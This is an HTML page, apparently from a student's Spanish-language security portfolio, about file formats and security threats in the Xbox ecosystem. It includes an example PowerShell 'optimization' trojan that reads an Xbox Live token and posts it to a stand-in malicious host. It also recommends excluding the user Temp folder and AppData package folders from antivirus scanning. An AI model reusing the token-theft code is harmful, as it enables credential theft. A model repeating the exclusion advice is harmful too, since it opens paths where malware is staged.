@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <!-- Basic -->
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <!-- Mobile Metas -->
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+  <!-- Site Metas -->
+  <meta name="keywords" content="" />
+  <meta name="description" content="" />
+  <meta name="author" content="" />
+
+  <title>Royal</title>
+
+  <!-- slider stylesheet -->
+  <link rel="stylesheet" type="text/css"
+    href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.1.3/assets/owl.carousel.min.css" />
+
+  <!-- bootstrap core css -->
+  <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
+
+  <!-- fonts style -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700|Roboto:400,500&display=swap"
+    rel="stylesheet" />
+  <!-- Custom styles for this template -->
+  <link href="css/style.css" rel="stylesheet" />
+  <!-- responsive style -->
+  <link href="css/responsive.css" rel="stylesheet" />
+  <style>
+
+
+
+body{
+    background:#0b0f1a;
+    color:#e5e7eb;
+    line-height:1.7;
+    padding:40px;
+}
+
+.container{
+    max-width:1200px;
+    margin:auto;
+}
+
+
+
+section{
+    background:#111827;
+    margin-bottom:35px;
+    padding:30px;
+    border-radius:18px;
+    border-left:6px solid #2563eb;
+    box-shadow:0 0 15px rgba(0,0,0,0.4);
+}
+
+h2{
+    color:#60a5fa;
+    margin-bottom:20px;
+    font-size:30px;
+}
+
+h3{
+    color:#93c5fd;
+    margin-top:20px;
+    margin-bottom:15px;
+}
+
+p{
+    margin-bottom:15px;
+    color:#d1d5db;
+}
+
+table{
+    width:100%;
+    border-collapse:collapse;
+    margin-top:20px;
+    margin-bottom:20px;
+}
+
+table th{
+    background:#1d4ed8;
+    color:white;
+    padding:14px;
+    text-align:left;
+}
+
+table td{
+    padding:14px;
+    border:1px solid #374151;
+}
+
+table tr:nth-child(even){
+    background:#1f2937;
+}
+
+table tr:nth-child(odd){
+    background:#111827;
+}
+
+ul, ol{
+    margin-left:25px;
+    margin-top:15px;
+    margin-bottom:15px;
+}
+
+li{
+    margin-bottom:10px;
+}
+
+.code-box{
+    background:#020617;
+    border:1px solid #2563eb;
+    padding:20px;
+    border-radius:12px;
+    overflow:auto;
+    margin-top:20px;
+    margin-bottom:20px;
+}
+
+pre{
+    color:#93c5fd;
+    white-space:pre-wrap;
+}
+
+.note{
+    background:#1e293b;
+    padding:15px;
+    border-left:5px solid #60a5fa;
+    border-radius:10px;
+    margin-top:20px;
+}
+
+
+hr{
+    border:none;
+    height:1px;
+    background:#374151;
+    margin:30px 0;
+}
+
+</style>
+</head>
+
+<body>
+  <!-- header section strats -->
+ <header class="header_section">
+    <div class="container">
+      <nav class="navbar navbar-expand-lg custom_nav-container ">
+        <a class="navbar-brand" href="#">
+          <div class="logo_box">
+            <img src="images/logo.png" alt="" />
+          </div>
+        </a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+          aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+          <ul class="navbar-nav ml-auto mr-2">
+            <li class="nav-item active">
+              <a class="nav-link" href="index.html">Inicio<span class="sr-only">(current)</span></a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="PF02.html">Parcial 1 </a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="PF03.html">Parcial 2</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="PF04.html">Parcial 3</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="proyectos.html">Proyectos</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="#">Final</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="contact.html">Notas</a>
+            </li>
+          </ul>
+          
+        </div>
+      </nav>
+    </div>
+  </header>
+  <!-- end header section -->
+<br><br>
+
+<h1>Seguridad y Arquitectura de Archivos en el Ecosistema Xbox</h1>
+
+    <h2>Introducción</h2>
+    <p>
+        La industria de Xbox utiliza una amplia variedad de extensiones de archivos y mecanismos de seguridad
+        para la gestión de videojuegos, contenido multimedia, instalación de aplicaciones y almacenamiento de datos.
+        Este ecosistema incluye consolas como Xbox, Xbox 360, Xbox One y Xbox Series X/S, además de la integración
+        con PC mediante la aplicación Xbox y los servicios de juego en Windows 10/11.
+    </p>
+
+    <hr>
+
+    <h1>Extensiones de Archivos Utilizadas en Xbox</h1>
+
+    <h2>1. Ejecutables y Paquetes de Juego</h2>
+
+    <table border="1">
+        <tr>
+            <th>Extensión</th>
+            <th>Descripción</th>
+        </tr>
+        <tr>
+            <td>.xbe</td>
+            <td>Formato ejecutable principal utilizado en la Xbox original.</td>
+        </tr>
+        <tr>
+            <td>.xex</td>
+            <td>Archivo ejecutable utilizado por Xbox 360.</td>
+        </tr>
+        <tr>
+            <td>.appx / .msixvc</td>
+            <td>Formatos empleados para instalar juegos y aplicaciones en Windows 10/11 y consolas Xbox modernas.</td>
+        </tr>
+        <tr>
+            <td>.xvc</td>
+            <td>Archivo empaquetado de juegos para Xbox One y Xbox Series X/S.</td>
+        </tr>
+        <tr>
+            <td>.xpa</td>
+            <td>Archivos asociados al programa Xbox Play Anywhere.</td>
+        </tr>
+    </table>
+
+    <h2>2. Contenido y Datos de Juego</h2>
+
+    <table border="1">
+        <tr>
+            <th>Extensión</th>
+            <th>Descripción</th>
+        </tr>
+        <tr>
+            <td>.pak</td>
+            <td>Paquetes de datos utilizados para almacenar texturas, modelos y audio.</td>
+        </tr>
+        <tr>
+            <td>.wad</td>
+            <td>Archivo de datos usado en motores derivados de Doom o id Tech.</td>
+        </tr>
+        <tr>
+            <td>.vpp</td>
+            <td>Formato de datos utilizado en juegos como Saints Row.</td>
+        </tr>
+        <tr>
+            <td>.arc</td>
+            <td>Contenedor comprimido de archivos común en títulos de Capcom.</td>
+        </tr>
+        <tr>
+            <td>.asset</td>
+            <td>Archivo de recursos utilizado en motores Unity.</td>
+        </tr>
+        <tr>
+            <td>.xsb</td>
+            <td>Banco de sonidos de Xbox mediante XACT.</td>
+        </tr>
+        <tr>
+            <td>.xwb</td>
+            <td>Archivo de ondas de sonido utilizado por XACT.</td>
+        </tr>
+        <tr>
+            <td>.xma</td>
+            <td>Formato de audio nativo de Xbox.</td>
+        </tr>
+    </table>
+
+    <h2>3. Archivos de Sistema y Multimedia</h2>
+
+    <table border="1">
+        <tr>
+            <th>Extensión</th>
+            <th>Descripción</th>
+        </tr>
+        <tr>
+            <td>.xvd</td>
+            <td>Xbox Virtual Disk utilizado para instalaciones de juegos.</td>
+        </tr>
+        <tr>
+            <td>.xbx</td>
+            <td>Archivo de metadatos o texturas específicas de Xbox.</td>
+        </tr>
+        <tr>
+            <td>.xpr</td>
+            <td>Recursos empaquetados para texturas y shaders.</td>
+        </tr>
+        <tr>
+            <td>.xmh</td>
+            <td>Archivo de metadatos de cabecera.</td>
+        </tr>
+        <tr>
+            <td>.bik</td>
+            <td>Formato Bink Video empleado en cinemáticas de videojuegos.</td>
+        </tr>
+        <tr>
+            <td>.xef</td>
+            <td>Archivos relacionados con eventos o capturas de juego.</td>
+        </tr>
+        <tr>
+            <td>.cfg / .ini</td>
+            <td>Archivos de configuración utilizados para almacenar ajustes del usuario.</td>
+        </tr>
+    </table>
+
+    <hr>
+
+    <h1>Variables de Entorno Vulnerables ante Ransomware</h1>
+
+    <table border="1">
+        <tr>
+            <th>Variable</th>
+            <th>Riesgo de Seguridad</th>
+        </tr>
+        <tr>
+            <td>PATH</td>
+            <td>Permite priorizar la ejecución de binarios maliciosos.</td>
+        </tr>
+        <tr>
+            <td>SystemRoot / windir</td>
+            <td>Acceso a directorios críticos del sistema operativo.</td>
+        </tr>
+        <tr>
+            <td>USERPROFILE</td>
+            <td>Localización de documentos y archivos personales para cifrado.</td>
+        </tr>
+        <tr>
+            <td>APPDATA</td>
+            <td>Persistencia y almacenamiento de payloads maliciosos.</td>
+        </tr>
+        <tr>
+            <td>LOCALAPPDATA</td>
+            <td>Instalación de componentes sin privilegios elevados.</td>
+        </tr>
+        <tr>
+            <td>TEMP / TMP</td>
+            <td>Descarga y ejecución inicial de malware.</td>
+        </tr>
+        <tr>
+            <td>HOMEPATH / HOMEDRIVE</td>
+            <td>Exploración de directorios personales.</td>
+        </tr>
+        <tr>
+            <td>PROGRAMDATA</td>
+            <td>Persistencia compartida entre múltiples usuarios.</td>
+        </tr>
+        <tr>
+            <td>COMSPEC</td>
+            <td>Uso indirecto del intérprete de comandos.</td>
+        </tr>
+        <tr>
+            <td>PATHEXT</td>
+            <td>Facilita la ejecución automática de archivos maliciosos.</td>
+        </tr>
+        <tr>
+            <td>COMPUTERNAME</td>
+            <td>Identificación del equipo para propagación interna.</td>
+        </tr>
+        <tr>
+            <td>USERDOMAIN / LOGONSERVER</td>
+            <td>Reconocimiento de redes corporativas y movimiento lateral.</td>
+        </tr>
+    </table>
+
+    <hr>
+
+    <h1>Exclusiones Recomendadas para Antivirus</h1>
+
+    <h2>Carpetas Principales</h2>
+
+    <ol>
+        <li>C:\Program Files\WindowsApps</li>
+        <li>C:\Program Files\ModifiableWindowsApps</li>
+        <li>C:\Program Files\XboxGames</li>
+        <li>C:\Users\[Usuario]\AppData\Local\Packages</li>
+        <li>C:\Users\[Usuario]\AppData\Local\Packages\Microsoft.XboxApp_8wekyb3d8bbwe</li>
+        <li>C:\Users\[Usuario]\AppData\Local\Packages\Microsoft.GamingApp_8wekyb3d8bbwe</li>
+        <li>C:\Users\[Usuario]\AppData\Local\XboxGames</li>
+        <li>C:\XboxGames</li>
+        <li>C:\Program Files\WindowsApps\Microsoft.GamingServices_*</li>
+        <li>C:\Program Files\WindowsApps\Microsoft.XboxIdentityProvider_*</li>
+    </ol>
+
+    <h2>Ejecutables Relacionados</h2>
+
+    <ol start="11">
+        <li>GamingServices.exe</li>
+        <li>XboxApp.exe</li>
+        <li>Microsoft.Gaming.JsonGateway.exe</li>
+        <li>XboxIdentityProvider.exe</li>
+        <li>XboxGameOverlay.exe</li>
+    </ol>
+
+    <h2>Servicios y Archivos de Soporte</h2>
+
+    <ol start="16">
+        <li>C:\Windows\System32\GamingServices.exe</li>
+        <li>C:\Windows\System32\GamingServicesNet.exe</li>
+        <li>C:\Windows\System32\xinput1_4.dll</li>
+        <li>C:\Users\[Usuario]\AppData\Local\Temp</li>
+        <li>C:\ProgramData\Microsoft\Windows\AppRepository</li>
+    </ol>
+
+    <hr>
+
+    <h1>Amenazas de Ciberseguridad en la Industria Xbox</h1>
+
+    <h2>1. Ataques a la Cadena de Suministro</h2>
+
+    <p>
+        En lugar de atacar directamente las consolas, los atacantes suelen comprometer el entorno de desarrollo.
+    </p>
+
+    <ul>
+        <li>Inserción de código malicioso en scripts automatizados.</li>
+        <li>Compromiso de dependencias externas.</li>
+        <li>Manipulación del proceso de compilación.</li>
+    </ul>
+
+    <h2>2. Exfiltración de Datos</h2>
+
+    <p>
+        El malware puede monitorear carpetas del proyecto, detectar cambios en archivos críticos y enviar
+        información sensible a servidores externos.
+    </p>
+
+    <ul>
+        <li>Código fuente.</li>
+        <li>Assets no anunciados.</li>
+        <li>Builds internas.</li>
+        <li>Llaves de firmado digital.</li>
+    </ul>
+
+    <h2>3. Persistencia en Dev Kits</h2>
+
+    <p>
+        Las consolas de desarrollo poseen herramientas de depuración avanzadas que pueden ser abusadas.
+    </p>
+
+    <ul>
+        <li>Uso indebido de xbtool o xbconnect.</li>
+        <li>Creación de tareas programadas maliciosas.</li>
+        <li>Instalación de agentes persistentes.</li>
+    </ul>
+
+    <h2>4. Movimiento Lateral</h2>
+
+    <p>
+        Una vez comprometida una estación de trabajo, el malware puede expandirse dentro de la red corporativa.
+    </p>
+
+    <ul>
+        <li>Escaneo de servidores NAS.</li>
+        <li>Robo de credenciales.</li>
+        <li>Acceso a servidores de compilación.</li>
+        <li>Obtención de certificados y llaves privadas.</li>
+    </ul>
+
+    <hr>
+
+    <h1>Ejemplo Conceptual de Código Malicioso</h1>
+
+<pre>
+# Script de "Optimización" que en realidad actúa como troyano
+function Optimize-XboxAssets {
+
+    # Acción legítima
+    Remove-Item ".\Temp\*" -Recurse
+
+    # Acción maliciosa
+    $token = Get-Content "$env:USERPROFILE\.xboxlive\token.dat"
+
+    if ($token) {
+        Invoke-WebRequest `
+        -Uri "https://servidor-malicioso.com/collect?data=$token" `
+        -Method Post
+    }
+}
+</pre>
+
+    <p>
+        Nota: Este ejemplo tiene fines educativos para comprender cómo operan ciertas amenazas
+        y fortalecer prácticas de seguridad.
+    </p>
+
+    <hr>
+
+    <h1>Medidas de Protección Utilizadas en Xbox</h1>
+
+    <h2>Sandboxing Estricto</h2>
+
+    <p>
+        Los juegos ejecutados en Xbox no pueden acceder libremente a archivos de otros juegos
+        ni a componentes críticos del sistema operativo.
+    </p>
+
+    <h2>Firmado Digital de Código</h2>
+
+    <p>
+        Todo software ejecutado en Xbox debe estar firmado digitalmente por Microsoft
+        o mediante certificados válidos de desarrollador.
+    </p>
+
+    <h2>EDR (Endpoint Detection and Response)</h2>
+
+    <p>
+        Los estudios utilizan soluciones EDR para detectar transferencias anómalas,
+        procesos sospechosos y comportamientos inusuales.
+    </p>
+
+    <h2>Validación de Dependencias</h2>
+
+    <ul>
+        <li>Verificar la integridad de librerías externas.</li>
+        <li>Evitar scripts desconocidos.</li>
+        <li>Proteger repositorios privados.</li>
+        <li>Aplicar autenticación multifactor.</li>
+    </ul>
+
+    <hr>
+
+    <h1>Conclusión</h1>
+
+    <p>
+        La seguridad dentro del ecosistema Xbox representa un componente crítico para proteger
+        la propiedad intelectual, los entornos de desarrollo y la integridad de los videojuegos.
+        Comprender el funcionamiento de los formatos de archivos, variables del sistema y vectores
+        de ataque permite implementar mejores prácticas de ciberseguridad.
+    </p>
+
+  <br><br>
+
+  <!-- end contact section -->
+
+  <!-- footer section -->
+  <section class="container-fluid footer_section">
+    <p>
+      Copyright &copy; 2019 All Rights Reserved By
+      <a href="https://html.design/">Free Html Templates</a>
+    </p> 
+    <br>
+    <p>Portafolio Digital – Seguridad Informática</p>
+  </section>
+  <!-- footer section -->
+
+  <script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>
+  <script type="text/javascript" src="js/bootstrap.js"></script>
+  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.2.1/owl.carousel.min.js">
+  </script>
+  <script type="text/javascript">
+    $(".owl-carousel").owlCarousel({
+      loop: true,
+      margin: 20,
+      nav: true,
+      navText: [],
+      autoplay: true,
+      autoplayHoverPause: true,
+      responsive: {
+        0: {
+          items: 1
+        },
+        600: {
+          items: 2
+        },
+        1000: {
+          items: 3
+        }
+      }
+    });
+  </script>
+
+  <script>
+    $(".nav_search-btn").click(function () {
+      if ($(".nav_search-input").hasClass("d-none")) {
+        event.preventDefault();
+        $(".nav_search-input")
+          .animate({
+              left: "-1000px"
+            },
+            "1000000"
+          )
+          .removeClass("d-none");
+      } else {
+        $(".nav_search-input")
+          .animate({
+              left: "0px"
+            },
+            "1000000"
+          )
+          .addClass("d-none");
+      }
+    });
+  </script>
+
+
+
+</body>
+
+</html>
